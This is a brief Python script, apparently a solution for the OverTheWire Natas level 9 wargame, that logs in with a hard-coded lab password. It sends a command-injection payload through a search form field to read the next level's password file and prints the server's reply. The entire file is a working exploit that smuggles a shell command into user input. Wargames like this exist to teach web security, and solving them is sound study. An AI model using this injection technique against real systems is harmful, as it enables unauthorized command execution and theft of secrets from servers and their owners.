#!/bin/python3
import requests
import base64
import binascii
from bs4 import BeautifulSoup


username = "natas9"
password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"

r = requests.post('http://natas9.natas.labs.overthewire.org', auth=(username, password), data={"needle":";cat /etc/natas_webpass/natas10 #", "submit":"submit"})
soup = BeautifulSoup(r.text, "html.parser")
print(soup.prettify())
print(r.text)
